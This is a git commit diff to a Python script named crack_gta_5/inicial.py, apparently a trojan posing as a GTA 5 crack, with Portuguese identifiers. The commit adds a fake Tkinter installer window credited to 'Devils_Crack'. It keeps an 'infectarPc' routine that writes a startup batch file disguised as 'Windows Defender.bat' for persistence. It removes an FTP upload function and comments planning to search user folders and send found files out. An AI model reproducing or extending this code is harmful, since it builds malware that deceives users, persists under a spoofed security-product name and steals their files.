b193de3b0b237cb459982389c12f2fa251ba51ac
renantescaro <renantescaro@yahoo.com.br>
2019-08-25 11:17:29 -0300

    interface grafica com tkinter

--- crack_gta_5/inicial.py
+++ crack_gta_5/inicial.py
@@ -1,7 +1,7 @@
 import time
 import os
 import threading
-import ftplib
+from tkinter import *
 
 
 def msgInstalacao():
@@ -14,8 +14,8 @@ def msgInstalacao():
         print(str(x) + "%")
         time.sleep(.500)
 
+
 def criarBatInicializacao():
-        # só funciona no Windows 10 ( Eu acho )
         with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Windows Defender.bat", "w") as arq:
                 
                 arq.write("echo off")
@@ -28,26 +28,52 @@ def criarBatInicializacao():
                 arq.write("\n")
                 arq.close()
 
-def subirFtp():
-        session = ftplib.FTP('server.address.com','USERNAME','PASSWORD')
-        file = open('kitten.jpg','rb')                  # file to send
-        session.storbinary('STOR kitten.jpg', file)     # send the file
-        file.close()                                    # close file and FTP
-        session.quit()
 
 def navegarPastas():
         dir = os.path.dirname(os.path.realpath(__file__))
 
-        # ******* Pensar a respeito *******
-
-        # buscar por arquivos nas pastas do usuario
-        # se encontrar, subir para ftp
-        # subirFtp()
-        
 
 def infectarPc():
         criarBatInicializacao()
         navegarPastas()
+
+
+def btn_click():
+    lb["text"] = "E ai"
+
+
+# TKINTER
+
+janela = Tk()
+janela.title("Crack GTA 5")
+janela.geometry("500x300+150+150")
+
+lbTitulo = Label(janela, text="Crack GTA 5")
+lbDescricao = Label(janela, text="Versão 4.20 - By Devils_Crack")
+lbDesenvolvedores1 = Label(janela, fg="red", text="weberRich4rds, S4tiv4, kamaLion")
+lbDesenvolvedores2 = Label(janela, fg="red", text="susuk1_green, qwerty_Dev1l")
+lbDesenvolvedores3 = Label(janela, fg="red", text="she_kakarot4, mc_hackudao")
+
+btnProximo = Button(janela, width=15, text="Proximo", command=btn_click)
+btnCancelar = Button(janela, width=15, text="Cancelar", command=btn_click)
+
+imagem = PhotoImage(file="imagem.png")
+img = Label(janela, image=imagem)
+img.imagem = imagem
+img.pack()
+
+lbTitulo.place(x=250, y=10)
+lbDescricao.place(x=250, y=40)
+lbDesenvolvedores1.place(x=250, y=100)
+lbDesenvolvedores2.place(x=250, y=140)
+lbDesenvolvedores3.place(x=250, y=180)
+img.place(x=0, y=0)
+
+btnProximo.place(x=380, y=250)
+btnCancelar.place(x=250, y=250)
+
+janela.mainloop()
+
 
 t = threading.Thread(target=msgInstalacao)
 t.start()
